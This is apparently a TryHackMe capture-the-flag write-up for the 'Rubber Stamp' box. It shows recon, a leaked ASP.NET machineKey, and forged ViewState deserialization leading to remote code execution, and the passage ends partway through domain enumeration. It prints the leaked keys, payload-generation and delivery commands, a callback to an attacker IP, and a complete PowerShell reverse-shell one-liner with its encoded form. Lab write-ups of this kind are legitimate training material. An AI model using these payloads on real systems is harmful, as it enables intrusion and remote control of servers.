---
title: "Rubber Stamp"
date: 11-12-2026
excerpt: TryHackMe Writeup
cover: ../uploads/cover_rubbers.jpg
tags: .NET Deserialization, ADCS, ESC1
---

Welcome back to my writeup! It's been a while since my last one. Today I'll walk through **Rubber Stamp**, a TryHackMe Active Directory "Boot2Root" machine. This box is a great example of how a single forgotten backup file on a web server can cascade all the way into full **Domain Administrator** compromise. Along the way we'll touch on ASP.NET Web Forms internals, ViewState deserialization, Windows reverse shells, Active Directory enumeration, and Active Directory Certificate Services (ADCS) abuse — specifically the infamous **ESC1** misconfiguration.

This version of the writeup expands on the original with more background on *why* each step works, not just *what* was typed, so that readers who are less familiar with .NET internals or ADCS can follow along. Every command, every tool output, and every screenshot from the original writeup has been kept exactly as it was — only the surrounding explanations have been rewritten and expanded for clarity.

---

# Phase 1: Reconnaissance

Every engagement starts with mapping out what's actually exposed on the target. Before touching a single web page, we need to know what services are running, what ports are open, and what kind of machine we're dealing with.

## 1.1 Nmap Service and Version Scan

We kick things off with an aggressive Nmap scan (`-A`) to grab service versions, OS fingerprints, and script output all in one pass, using `-T5` to speed things along:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ nmap -A -T5 10.48.184.32                                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-11 09:18 -0500
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.86% done; ETC: 09:19 (0:00:04 remaining)
Nmap scan report for 10.48.184.32
Host is up (0.14s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Home - Rubberstamp
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-11 14:18:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rubberstamp.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SRV01.rubberstamp.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SRV01.rubberstamp.local
| Not valid before: 2026-10-25T16:50:39
|_Not valid after:  2027-10-25T16:50:39
|_ssl-date: 2026-11-11T14:19:17+00:00; -1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rubberstamp.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-11T14:19:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SRV01.rubberstamp.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SRV01.rubberstamp.local
| Not valid before: 2026-10-25T16:50:39
|_Not valid after:  2027-10-25T16:50:39
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rubberstamp.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SRV01.rubberstamp.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SRV01.rubberstamp.local
| Not valid before: 2026-10-25T16:50:39
|_Not valid after:  2027-10-25T16:50:39
|_ssl-date: 2026-11-11T14:19:17+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rubberstamp.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SRV01.rubberstamp.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SRV01.rubberstamp.local
| Not valid before: 2026-10-25T16:50:39
|_Not valid after:  2027-10-25T16:50:39
|_ssl-date: 2026-11-11T14:19:17+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SRV01.rubberstamp.local
| Not valid before: 2026-10-24T16:00:17
|_Not valid after:  2027-04-25T16:00:17
| rdp-ntlm-info: 
|   Target_Name: RUBBERSTAMP
|   NetBIOS_Domain_Name: RUBBERSTAMP
|   NetBIOS_Computer_Name: SRV01
|   DNS_Domain_Name: rubberstamp.local
|   DNS_Computer_Name: SRV01.rubberstamp.local
|   DNS_Tree_Name: rubberstamp.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-11T14:19:08+00:00
|_ssl-date: 2026-11-11T14:19:17+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Aggressive OS guesses: Microsoft Windows 10 1709 - 22H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 1803 (92%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 11 24H2 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: SRV01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-11T14:19:12
|_  start_date: N/A

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   126.39 ms 192.168.128.1
2   ...
3   128.91 ms 10.49.178.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.23 seconds
```

The scan paints a very clear picture: this is a single Windows host (`SRV01`) that is simultaneously acting as the **domain controller** for `rubberstamp.local` (we can tell from LDAP on 389/636/3268/3269, Kerberos on 88, and `kpasswd` on 464) *and* serving a public-facing website over IIS on port 80. Having the DC double as a web server is already a red flag from a security-hardening standpoint, since it means a web application bug can directly expose Active Directory.

## 1.2 Anonymous SMB / Null Session Check

With the domain name known, the next logical step is to check whether SMB allows any kind of unauthenticated or guest access, and to grab a hosts file we can drop straight into `/etc/hosts`:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ nxc smb 10.48.184.32 -u guest -p '' --generate-hosts-file host 
SMB         10.48.184.32    445    SRV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:rubberstamp.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.48.184.32    445    SRV01            [-] rubberstamp.local\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                             
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ cat host    
10.48.184.32     SRV01.rubberstamp.local rubberstamp.local SRV01
```

The Guest account is disabled, so that door is closed — but NetExec (`nxc`) confirms **Null Auth: True**, meaning the server still permits an anonymous (null) session to SMB, enough to confirm the hostname, domain, and build number. This hands us exactly what we need to populate our local name resolution.

## 1.3 Updating `/etc/hosts`

Since the box relies on Kerberos and internal DNS naming conventions (`SRV01.rubberstamp.local`), our attacking machine needs to resolve those names correctly. We add the entries generated above into `/etc/hosts`, which lets both our browser and command-line tools reach the site by name instead of raw IP — this matters a lot for Kerberos authentication and for any logic in the web app that depends on the `Host` header.

---

# Phase 2: Web Application Enumeration

With name resolution sorted, it's time to actually look at what the website offers.

## 2.1 First Look at the Site

Visiting the site in a browser shows a simple, unassuming business-style web app:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbrRYbq3bsZvf2ULWGluD%252FScreenshot%25202026-11-11%2520222310.png%3Falt%3Dmedia%26token%3Dc7fe03f9-087c-4e47-9fe7-3c994c5cb20d&width=768&dpr=3&quality=100&sign=e0065c861542897218aa2d61842044b6&sv=3)

Nothing screams "vulnerable" at first glance, so the next step is to click through every page and feature looking for anything unusual — forms, hidden links, legacy functionality, anything that looks bolted on rather than part of the main app. The **Contact** section stands out:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPa2Ao4UW6iVYtv1y0QWR%252FScreenshot%25202026-11-11%2520222344.png%3Falt%3Dmedia%26token%3D5cc1fa2f-6e09-4dc3-9ed7-057a62f06883&width=768&dpr=3&quality=100&sign=691c2036e6cdf2daa28f2eca1199ab1f&sv=3)

## 2.2 The "Approval Status" Link and a Legacy Page

Clicking **Approval Status** is supposed to send us to `http://rubberstamp.local//legacy/RequestStatus.aspx`, but instead the app redirects us to a generic error page: `http://rubberstamp.local/Error?aspxerrorpath=/legacy/RequestStatus.aspx`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FglluqvXfHgKuaLLy0UnJ%252FScreenshot%25202026-11-11%2520222400.png%3Falt%3Dmedia%26token%3Dc6fdf4ca-3aed-4f43-a79c-dbcaed32e587&width=768&dpr=3&quality=100&sign=aee18ec136c0812212230e4f8dbef18c&sv=3)

The fact that the URL explicitly contains the word **legacy** is itself a strong clue — legacy code paths are a classic place to find outdated security practices still lurking in an otherwise modern-looking application.

## 2.3 Probing the `id` Parameter

Continuing to poke at the page, we notice it accepts an `id` query-string parameter (`?id=1`). When a numeric value is supplied, the page renders normally instead of bouncing to the error page. Interestingly:

- Negative numbers are accepted.
- Arbitrarily large numbers are accepted.
- Non-numeric characters (letters, symbols) immediately trigger the error redirect.

Since any numeric value is simply reflected back with no visible change in behavior, `id` looks like a "dummy" parameter rather than something tied to real backend logic — it doesn't look up a record, apply access control, or branch the response in any meaningful way. Still, out of due diligence, we test it for SQL injection, but come up empty:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FYHo3BjZcx4xw2RkNMQnh%252FScreenshot%25202026-11-11%2520222435.png%3Falt%3Dmedia%26token%3D7600f67b-68ac-4cc9-9c0e-ca55b6a5819a&width=768&dpr=3&quality=100&sign=87dd49273e725323658479a6ba6b5dae&sv=3)

## 2.4 Spotting the Real Attack Surface: ViewState

While the `id` parameter is a dead end, something much more interesting catches the eye: `RequestStatus.aspx` is a classic **ASP.NET Web Forms** page. We can tell because every response includes a hidden `__VIEWSTATE` field.

For readers unfamiliar with the technology: ViewState is how old-school ASP.NET Web Forms pages persist UI state (form values, control properties, etc.) between a page load and a postback, without needing a database or session lookup. The entire state is serialized into a blob, Base64-encoded, and shipped to the client inside a hidden form field. On the next request, the server reads that blob back, **deserializes** it, and restores the page's state from it.

Here's the critical security implication: if an attacker can produce a ViewState blob that the server considers *validly signed* (normally by knowing the server's secret `machineKey`), the server will happily deserialize **whatever object graph the attacker put inside it** — including one engineered to execute arbitrary code the moment it's deserialized. This class of bug is well known in the .NET world and is typically exploited with a tool like `ysoserial.net`, which builds malicious "gadget chains" for exactly this purpose. In short: get the machineKey, and ViewState deserialization becomes a direct path to Remote Code Execution (RCE).

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUChj9gkHInrXxDBNciuf%252FScreenshot%25202026-11-12%2520151936.png%3Falt%3Dmedia%26token%3D599fe278-9222-4b5a-af28-2ba970c963d9&width=768&dpr=3&quality=100&sign=0df3552626e17f00c36354fd1413bdf5&sv=3)

So the plan becomes clear: find a way to obtain (or leak) the machineKey values, then forge our own ViewState payload containing a malicious gadget chain.

---

# Phase 3: Content Discovery and Leaking the Machine Key

## 3.1 Fuzzing for Hidden / Backup Files

To find the machineKey, we first need to find any supporting files the developers might have left behind — backup copies, config exports, or debug artifacts are prime candidates. We run `ffuf` against the web root using a wordlist of common filenames, appending several likely backup/config extensions, and filtering out noisy status codes:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ ffuf -u 'http://rubberstamp.local/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -e .config,.bak,.old,.backup,.xml,.txt,.aspx -mc all -fc 302,404,403 -ac -t 150 -timeout 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://rubberstamp.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Extensions       : .config .bak .old .backup .xml .txt .aspx 
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 2
 :: Threads          : 150
 :: Matcher          : Response status: all
 :: Filter           : Response status: 302,404,403
________________________________________________

.                       [Status: 200, Size: 1876, Words: 492, Lines: 56, Duration: 141ms]
Global.asax.bak         [Status: 200, Size: 1259, Words: 258, Lines: 41, Duration: 138ms]
global.asax.bak         [Status: 200, Size: 1259, Words: 258, Lines: 41, Duration: 177ms]
```

Jackpot — `Global.asax.bak`. In an ASP.NET application, `Global.asax` is a special file that handles application-wide lifecycle events (startup, session events, and — importantly — unhandled errors). A `.bak` extension means it was likely left behind by an editor or a deployment script, and because IIS doesn't execute `.bak` as server-side code, requesting it serves up the **raw source code** instead of running it.

## 3.2 Reading the Leaked Source: A Built-In Debug Backdoor

Here's the full content of `Global.asax.bak`:

```c#
<%@ Application Language="C#" %>
<%@ Import Namespace="System.Web.Mvc" %>
<%@ Import Namespace="System.Web.Routing" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Configuration" %>
<script runat="server">

    void Application_Start(object sender, EventArgs e)
    {
        AreaRegistration.RegisterAllAreas();
        RouteConfig.RegisterRoutes(RouteTable.Routes);
    }

    void Application_Error(object sender, EventArgs e)
    {
        var context = ((HttpApplication)sender).Context;

        if (!context.Request.Path.StartsWith("/legacy/", StringComparison.OrdinalIgnoreCase))
        {
            return;
        }

        if (context.Request.QueryString["debug"] != "true")
        {
            return;
        }

        var ex = context.Server.GetLastError();
        var mk = (MachineKeySection)ConfigurationManager.GetSection("system.web/machineKey");

        context.Response.Clear();
        context.Response.StatusCode = 500;
        context.Response.Write("<pre>" + ex.ToString() +
            "\n\nvalidationKey=" + mk.ValidationKey +
            "\ndecryptionKey=" + mk.DecryptionKey +
            "\nvalidation=" + mk.Validation + "</pre>");
        context.Server.ClearError();
    }

</script>
```

Reading through this carefully, we find an intentional-looking but extremely dangerous debug feature: whenever an unhandled exception occurs on any path under `/legacy/`, **and** the request includes `?debug=true` in the query string, the custom error handler dumps the application's `machineKey` configuration straight into the HTTP response. That includes:

- `validationKey` — used to sign ViewState (and other tokens) so tampering can be detected.
- `decryptionKey` — used to encrypt/decrypt ViewState.
- `validation` algorithm — which hashing algorithm is used for the signature (e.g. SHA1, HMACSHA256).

This is effectively the keys to the kingdom. The `machineKey` is what the server uses to prove a ViewState blob hasn't been tampered with. If we know these values, **we can sign our own ViewState from scratch**, and the server will trust it completely, deserializing whatever we put inside — confirming the RCE theory we had from Phase 2.

## 3.3 Triggering the Leak

All that's needed is to hit any path under `/legacy/` that doesn't exist (so it throws an exception) with `debug=true` appended:

```
http://rubberstamp.local/legacy/RequestStatus.aspx?id=x&debug=true
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fyhrbc6NQY8ul1pj4Pac6%252FScreenshot%25202026-11-11%2520223143.png%3Falt%3Dmedia%26token%3D4a38469c-7572-4e2f-81a3-a66ec86fe9b6&width=768&dpr=3&quality=100&sign=7b38af0053d4b528b4b274ebb79dd5d7&sv=3)

Exactly as the leaked source predicted, the `validationKey`, `decryptionKey`, and `validation` algorithm are handed to us on a silver platter.

---

# Phase 4: Forging a Malicious ViewState for Remote Code Execution

## 4.1 The Plan: Build Our Own `ysoserial.net`

With valid machineKey material in hand, we can now construct a ViewState payload that:

1. Is correctly MAC-signed with the leaked `validationKey` (so the server accepts it as untampered).
2. Is correctly encrypted with the leaked `decryptionKey` (if encryption is enabled).
3. Contains a serialized .NET object graph — a "gadget chain" — that, when deserialized by `LosFormatter`/`ObjectStateFormatter`, triggers execution of an OS command.

The standard tool for this job is `ysoserial.net`, but it's a .NET/Windows tool, and at the time I didn't have a convenient Windows environment handy. So rather than fight with Wine or spin up a VM just for this, I wrote my own Python implementation that replicates the same core functionality — computing the correct ViewState MAC and building the known `ObjectDataProvider`/`TextFormattingRunProperties`-style gadget chain used for command execution.

You can check out the tool here: [FckYourSerial](https://github.com/kUrOSH1R0oo/FckYourSerial)

## 4.2 Crafting the Initial Proof-of-Concept Payload

As a first test, we build a payload that simply makes the server issue an outbound HTTP request back to us — a classic, low-risk way to confirm code execution before attempting a full reverse shell:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ python3 ysoserial_my_version.py -vkey "D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A" -ekey "A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4" --purpose "WebForms.HiddenFieldPageStatePersister.ClientState" --specific "TemplateSourceDirectory: /LEGACY" "Type: LEGACY_REQUESTSTATUS_ASPX" -cmd "curl.exe http://192.168.148.25:1234/shares" -o forged_vs.b64 
[*] command  : curl.exe http://192.168.148.25:1234/shares
[*] legacy   : False
[*] purpose  : WebForms.HiddenFieldPageStatePersister.ClientState
[*] specific : ['TemplateSourceDirectory: /LEGACY', 'Type: LEGACY_REQUESTSTATUS_ASPX']
[+] wrote base64 ViewState → forged_vs.b64
```

Note the `--purpose` and `--specific` flags: ViewState MAC computation in ASP.NET factors in contextual metadata like the page's virtual path and type name, not just the raw bytes. Getting these values wrong means the signature check fails silently and the server rejects the payload — so matching them to the actual `/legacy/RequestStatus.aspx` page is essential.

## 4.3 Delivering the Payload

Now we send the forged ViewState as a POST request to the vulnerable page:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ curl -s "http://rubberstamp.local/legacy/RequestStatus.aspx?id=1" -X POST --data-urlencode "__VIEWSTATE=$(tr -d '\n' < forged_vs.b64)" --data "__VIEWSTATEGENERATOR=0CA456E0" -o /dev/null -w "%{http_code}\n"                 
302
```

A `302` redirect is actually a good sign here — it means the page processed our POST without throwing a deserialization error, which implies our payload was accepted and ran.

## 4.4 Confirming Code Execution

We check the listener we stood up to catch the callback:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.48.184.32 - - [11/Nov/2026 10:02:11] code 404, message File not found
10.48.184.32 - - [11/Nov/2026 10:02:11] "GET /shares HTTP/1.1" 404 -
```

It works! The target server reached out to our listener, proving that our forged ViewState payload was deserialized and its embedded command executed — confirmed, full **Remote Code Execution**.

---

# Phase 5: From RCE to a Reverse Shell

## 5.1 The Reverse Shell Payload

Confirming blind RCE is nice, but we want an interactive shell. We use a self-contained PowerShell TCP reverse shell that reads commands from a socket and pipes output back:

```powershell
$a = New-Object System.Net.Sockets.TCPClient("192.168.148.25",1234);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($d = $b.Read($c, 0, $c.Length)) -ne 0){$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0,$d);$f = (iex $e 2>&1 | Out-String);$g = $f + "PS " + (pwd).Path + "> ";$h = ([text.encoding]::ASCII).GetBytes($g);$b.Write($h,0,$h.Length);$b.Flush()};$a.Close()
```

## 5.2 Generating a Fresh Forged ViewState with the Reverse Shell Embedded

This time, instead of `-cmd`, we pass the PowerShell one-liner with `-ps`, so our tool wraps it in the appropriate `powershell -enc <base64>` invocation and embeds that as the gadget-chain command:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ python3 ysoserial_my_version.py -vkey "D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A" -ekey "A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4" --purpose "WebForms.HiddenFieldPageStatePersister.ClientState" --specific "TemplateSourceDirectory: /LEGACY" "Type: LEGACY_REQUESTSTATUS_ASPX" -ps '$a = New-Object System.Net.Sockets.TCPClient("192.168.148.25",1234);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($d = $b.Read($c, 0, $c.Length)) -ne 0){$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0,$d);$f = (iex $e 2>&1 | Out-String);$g = $f + "PS " + (pwd).Path + "> ";$h = ([text.encoding]::ASCII).GetBytes($g);$b.Write($h,0,$h.Length);$b.Flush()};$a.Close()' -o forged_vs.b64
[*] command  : powershell -NoP -NonI -enc JABhACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADkAMgAuADEANgA4AC4AMQA0ADgALgAyADUAIgAsADEAMgAzADQAKQA7ACQAYgAgAD0AIAAkAGEALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABjACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZAAgAD0AIAAkAGIALgBSAGUAYQBkACgAJABjACwAIAAwACwAIAAkAGMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABjACwAMAAsACQAZAApADsAJABmACAAPQAgACgAaQBlAHgAIAAkAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAZwAgAD0AIAAkAGYAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAaAAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZwApADsAJABiAC4AVwByAGkAdABlACgAJABoACwAMAAsACQAaAAuAEwAZQBuAGcAdABoACkAOwAkAGIALgBGAGwAdQBzAGgAKAApAH0AOwAkAGEALgBDAGwAbwBzAGUAKAApAA==
[*] legacy   : False
[*] purpose  : WebForms.HiddenFieldPageStatePersister.ClientState
[*] specific : ['TemplateSourceDirectory: /LEGACY', 'Type: LEGACY_REQUESTSTATUS_ASPX']
[+] wrote base64 ViewState → forged_vs.b64
```

Encoding the payload as Base64 UTF-16LE (the standard `-enc` format PowerShell expects) avoids a lot of quoting and escaping headaches when the command travels through multiple layers — curl, the gadget chain, and PowerShell itself.

## 5.3 Setting Up the Listener

We spin up `penelope`, a feature-rich reverse shell handler, to catch the incoming connection:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ penelope -p 1234           
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 172.18.0.1 • 10.200.119.47 • 192.168.148.25
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

## 5.4 Firing the Payload

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ curl -s "http://rubberstamp.local/legacy/RequestStatus.aspx?id=1" -X POST --data-urlencode "__VIEWSTATE=$(tr -d '\n' < forged_vs.b64)" --data "__VIEWSTATEGENERATOR=0CA456E0" -o /dev/null -w "%{http_code}\n"
302
```

## 5.5 Catching the Shell

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ penelope -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 172.18.0.1 • 10.200.119.47 • 192.168.148.25
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => SRV01 10.48.184.32 Microsoft_Windows_Server_2019_Datacenter-x64-based_PC 👤 rubberstamp\svc-iisweb 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kuroshiro/.penelope/sessions/SRV01~10.48.184.32-Microsoft_Windows_Server_2019_Datacenter-x64-based_PC/2026_11_11-10_10_29-935-rubberstamp\svc-iisweb.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\windows\system32\inetsrv>
```

We land a shell as **`rubberstamp\svc-iisweb`** — the service account that the IIS Application Pool runs under. This is our initial foothold on the domain controller.

---

# Phase 6: Initial Foothold — Grabbing `user.txt`

## 6.1 Finding the User Flag

With an interactive shell, the first stop is always the usual flag locations. We find it sitting in the Public user profile:

```powershell
PS C:\Users\Public> ls


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---       11/14/2018   4:10 PM                Documents                                                             
d-r---        9/15/2018   7:19 AM                Downloads                                                             
d-r---        9/15/2018   7:19 AM                Music                                                                 
d-r---        9/15/2018   7:19 AM                Pictures                                                              
d-r---        9/15/2018   7:19 AM                Videos                                                                
-a----       10/27/2026   8:35 AM             40 user.txt                                                              


PS C:\Users\Public> cat user.txt
[REDACTED]
```

With `user.txt` secured, the goal now shifts to privilege escalation — going from a low-privileged service account all the way to full domain compromise.

---

# Phase 7: Local and Domain Enumeration

Rather than immediately reaching for exploitation tools, it pays to understand exactly what our current account can and can't do, and what the broader Active Directory environment looks like.

## 7.1 Checking Privileges

```powershell
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Nothing exciting here — no token-impersonation privileges like `SeImpersonatePrivilege` that would allow a quick local privilege escalation via tools like `PrintSpoofer` or `JuicyPotato`.

## 7.2 Checking Group Memberships

```powershell
PS C:\Users\Public> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                                           Attributes                                        
=========================================== ================ ============================================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                          Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                               Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                           Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool                  Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
```

This is the real "aha" moment of the enumeration phase: **`BUILTIN\Certificate Service DCOM Access`**. Membership in this group is a strong hint that the machine is running **Active Directory Certificate Services (ADCS)**, and that our current account is expected to interact with the certificate authority via DCOM/RPC. Whenever this group shows up in a `whoami /groups` output, it's worth immediately pivoting your enumeration toward the CA.

## 7.3 Confirming Our Kerberos Context

```powershell
